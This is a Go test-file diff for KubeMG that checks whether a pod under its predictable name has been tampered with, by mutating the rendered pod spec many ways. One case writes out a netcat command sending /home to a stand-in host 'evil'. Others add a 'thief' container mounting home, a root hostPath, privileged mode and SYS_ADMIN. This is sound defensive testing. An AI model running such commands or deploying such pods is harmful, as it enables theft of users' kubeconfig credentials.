@@ -210,7 +210,7 @@ func TestReadStatusReadsThePodsOwnAccountOfItself(t *testing.T) {
 			},
 		},
 		"spec": map[string]any{
-			"containers": []any{map[string]any{"image": "ghcr.io/kubemg/kubemg-shell:test"}},
+			"containers": []any{map[string]any{"name": "shell", "image": "ghcr.io/kubemg/kubemg-shell:test"}},
 		},
 		"status": map[string]any{
 			"phase":             "Running",
@@ -240,10 +240,10 @@ func TestReadStatusReadsThePodsOwnAccountOfItself(t *testing.T) {
 // rather than as row 0, which is a row somebody else could own.
 func TestReadStatusCarriesTheCredentialRow(t *testing.T) {
 	for annotation, want := range map[string]uint{
-		"41":         41,
-		"":           0,
-		"not-an-id":  0,
-		"-1":         0,
+		"41":        41,
+		"":          0,
+		"not-an-id": 0,
+		"-1":        0,
 	} {
 		status := ReadStatus(map[string]any{
 			"metadata": map[string]any{
@@ -395,5 +395,123 @@ func TestPodNamesThePullSecretOnlyWhenOneIsConfigured(t *testing.T) {
 	}
 	if got := pod.Spec.ImagePullSecrets; len(got) != 1 || got[0]["name"] != "mirror-pull" {
 		t.Fatalf("imagePullSecrets = %v, want one named mirror-pull", got)
+	}
+}
+
+// The pod KubeMG renders is its own; a pod under the same predictable name
+// that would let something else read the seeded kubeconfig is not.
+func TestReadStatusTellsAForeignPodFromItsOwn(t *testing.T) {
+	render := func() map[string]any {
+		raw, err := PodManifest(PodSpec{Namespace: "kubemg-system", Image: "shell:1", UserID: 7, Now: time.Now()})
+		if err != nil {
+			t.Fatal(err)
+		}
+		var pod map[string]any
+		if err := json.Unmarshal(raw, &pod); err != nil {
+			t.Fatal(err)
+		}
+		return pod
+	}
+	if got := ReadStatus(render()).ForeignFor("shell:1"); got != "" {
+		t.Fatalf("the rendered pod read as foreign: %s", got)
+	}
+	if ReadStatus(render()).ForeignFor("shell:2") == "" {
+		t.Fatal("a pod running another image read as KubeMG's own")
+	}
+	if got := (Status{}).ForeignFor("shell:1"); got != "" {
+		t.Fatalf("no pod at all read as foreign: %s", got)
+	}
+
+	// Fields the API server defaults are not compared.
+	defaulted := render()
+	container := defaulted["spec"].(map[string]any)["containers"].([]any)[0].(map[string]any)
+	container["imagePullPolicy"] = "IfNotPresent"
+	container["terminationMessagePath"] = "/dev/termination-log"
+	if got := ReadStatus(defaulted).ForeignFor("shell:1"); got != "" {
+		t.Fatalf("a defaulted field read as foreign: %s", got)
+	}
+
+	cases := map[string]func(spec map[string]any){
+		"agent service account": func(spec map[string]any) { spec["serviceAccountName"] = "kubemg-agent" },
+		"token mounted":         func(spec map[string]any) { spec["automountServiceAccountToken"] = true },
+		"token not declared":    func(spec map[string]any) { delete(spec, "automountServiceAccountToken") },
+		"shared processes":      func(spec map[string]any) { spec["shareProcessNamespace"] = true },
+		"host pid":              func(spec map[string]any) { spec["hostPID"] = true },
+		"other command": func(spec map[string]any) {
+			spec["containers"].([]any)[0].(map[string]any)["command"] = []any{"/bin/sh", "-c", "nc evil 1 < /home"}
+		},
+		"extra args": func(spec map[string]any) {
+			spec["containers"].([]any)[0].(map[string]any)["args"] = []any{"x"}
+		},
+		"reader of home": func(spec map[string]any) {
+			spec["containers"] = append(spec["containers"].([]any), map[string]any{
+				"name": "thief", "volumeMounts": []any{map[string]any{"name": "home", "mountPath": "/loot"}},
+			})
+		},
+		"home on a host path": func(spec map[string]any) {
+			spec["volumes"].([]any)[0] = map[string]any{"name": "home", "hostPath": map[string]any{"path": "/"}}
+		},
+		"no shell container": func(spec map[string]any) {
+			spec["containers"].([]any)[0].(map[string]any)["name"] = "other"
+		},
+		"ephemeral container": func(spec map[string]any) {
+			spec["ephemeralContainers"] = []any{map[string]any{"name": "debug", "targetContainerName": "shell"}}
+		},
+		"node path elsewhere": func(spec map[string]any) {
+			spec["volumes"] = append(spec["volumes"].([]any), map[string]any{
+				"name": "kubelet", "hostPath": map[string]any{"path": "/var/lib/kubelet"},
+			})
+		},
+		"extra mount in the shell": func(spec map[string]any) {
+			container := spec["containers"].([]any)[0].(map[string]any)
+			container["volumeMounts"] = append(container["volumeMounts"].([]any),
+				map[string]any{"name": "loot", "mountPath": HomeDir + "/.kube"})
+		},
+		"sidecar": func(spec map[string]any) {
+			spec["containers"] = append(spec["containers"].([]any), map[string]any{"name": "istio-proxy", "image": "proxy"})
+		},
+		"sidecar first": func(spec map[string]any) {
+			spec["containers"] = append([]any{map[string]any{"name": "evil", "image": "x"}}, spec["containers"].([]any)...)
+		},
+		"init container": func(spec map[string]any) {
+			spec["initContainers"] = []any{map[string]any{"name": "prep", "image": "x"}}
+		},
+		"pvc": func(spec map[string]any) {
+			spec["volumes"] = append(spec["volumes"].([]any), map[string]any{
+				"name": "data", "persistentVolumeClaim": map[string]any{"claimName": "x"},
+			})
+		},
+		"PATH in the environment": func(spec map[string]any) {
+			container := spec["containers"].([]any)[0].(map[string]any)
+			container["env"] = append(container["env"].([]any), map[string]any{"name": "PATH", "value": "/tmp"})
+		},
+		"env from a secret": func(spec map[string]any) {
+			container := spec["containers"].([]any)[0].(map[string]any)
+			container["env"].([]any)[0] = map[string]any{"name": "HOME", "valueFrom": map[string]any{}}
+		},
+		"working dir": func(spec map[string]any) {
+			spec["containers"].([]any)[0].(map[string]any)["workingDir"] = "/tmp"
+		},
+		"lifecycle hook": func(spec map[string]any) {
+			spec["containers"].([]any)[0].(map[string]any)["lifecycle"] = map[string]any{"postStart": map[string]any{}}
+		},
+		"privileged": func(spec map[string]any) {
+			spec["containers"].([]any)[0].(map[string]any)["securityContext"].(map[string]any)["privileged"] = true
+		},
+		"added capability": func(spec map[string]any) {
+			spec["containers"].([]any)[0].(map[string]any)["securityContext"].(map[string]any)["capabilities"] =
+				map[string]any{"add": []any{"SYS_ADMIN"}}
+		},
+		"home mounted elsewhere": func(spec map[string]any) {
+			container := spec["containers"].([]any)[0].(map[string]any)
+			container["volumeMounts"].([]any)[0] = map[string]any{"name": "home", "mountPath": "/elsewhere"}
+		},
+	}
+	for name, mutate := range cases {
+		pod := render()
+		mutate(pod["spec"].(map[string]any))
+		if ReadStatus(pod).Foreign == "" {
+			t.Errorf("%s: read as KubeMG's own pod", name)
+		}
 	}
 }
